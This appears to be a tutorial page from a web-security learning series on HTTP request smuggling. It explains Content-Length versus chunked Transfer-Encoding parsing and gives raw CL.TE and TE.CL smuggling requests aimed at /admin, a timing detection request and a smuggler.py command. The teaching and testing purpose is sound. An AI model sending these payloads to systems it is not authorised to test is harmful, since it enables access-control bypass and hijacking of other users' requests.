---
title: "HTTP Request Smuggling"
topic: "http-request-smuggling"
tags: [http, request-smuggling, transfer-encoding, content-length, web-security, proxy]
difficulty: advanced
day: 53
layout: default
parent: Topics
nav_order: 53
---

# HTTP Request Smuggling

## What You Will Learn
- What HTTP request smuggling is and why it happens
- How Content-Length and Transfer-Encoding headers conflict
- How CL.TE and TE.CL attacks work with real examples
- How to detect and test for request smuggling

## What Is It?

HTTP request smuggling occurs due to a discrepancy between how two nodes (front-end and back-end) parse the same HTTP request. When a request is parsed differently by each node, an attacker can "smuggle" an additional request that the front-end does not see but the back-end processes.

Two important headers are involved:
- **Content-Length**: Specifies the exact byte size of the request body
- **Transfer-Encoding**: Uses chunked encoding — body is sent in chunks with sizes prefixed in hex

## Why It Matters

Request smuggling can:
- Bypass front-end security controls (WAF, access control)
- Poison the back-end request queue to hijack other users' requests
- Capture credentials or session tokens from other users

## Transfer Encoding (Chunked)

In chunked transfer encoding, the body is sent as a series of chunks. Each chunk starts with its size in hexadecimal, followed by CRLF, then the data:

```
4\r\n
This\r\n
7\r\n
is test\r\n
0\r\n
\r\n
```

The final chunk has a size of 0, indicating the end.

## CASE 1: CL.TE (Front-end uses Content-Length, Back-end uses Transfer-Encoding)

The front-end counts bytes using Content-Length. The back-end expects chunked encoding.

```http
POST / HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 32
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-Injected: header
```

The front-end sees a POST request with 32 bytes of body (including the `0\r\n\r\nGET /admin...` part). It forwards the whole thing.

The back-end, using chunked encoding, sees:
1. A POST request that ends at the `0` chunk
2. A second request: `GET /admin HTTP/1.1`

The `GET /admin` request bypasses any front-end checks.

## CASE 2: TE.CL (Front-end uses Transfer-Encoding, Back-end uses Content-Length)

The front-end parses chunked encoding. The back-end counts bytes using Content-Length.

```http
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

5e
POST /admin HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

The front-end, using Transfer-Encoding, sees two chunks: one with 0x5e (94) bytes and a terminating `0`. It forwards the whole request.

The back-end, using Content-Length of 4, reads `5e\r\n` as the body and sees the rest as a second request:

```http
POST /admin HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
```

This second request bypasses any front-end restriction on `/admin`.

## Detection

```bash
# Use Burp Suite's HTTP Request Smuggler extension
# Or manually test with timing — a CL.TE payload causes a delay on the back-end

# Timing test for CL.TE
POST / HTTP/1.1
Transfer-Encoding: chunked
Content-Length: 6

3
abc
X
```

If the request times out (10+ seconds), the back-end is waiting for more data — indicating TE support.

## Tools

```bash
# Burp Suite — HTTP Request Smuggler extension by James Kettle
# smuggler.py — automated smuggling detection tool
python3 smuggler.py -u https://target.com/

# HTTP/2 downgrade smuggling
# h2smuggler — HTTP/2 to HTTP/1.1 smuggling tool
```

## Resources

- [PortSwigger — HTTP Request Smuggling](https://portswigger.net/web-security/request-smuggling)
- [James Kettle — HTTP Desync Attacks](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)
- [Smuggler Tool](https://github.com/defparam/smuggler)
- [TryHackMe — HTTP Request Smuggling](https://tryhackme.com/)
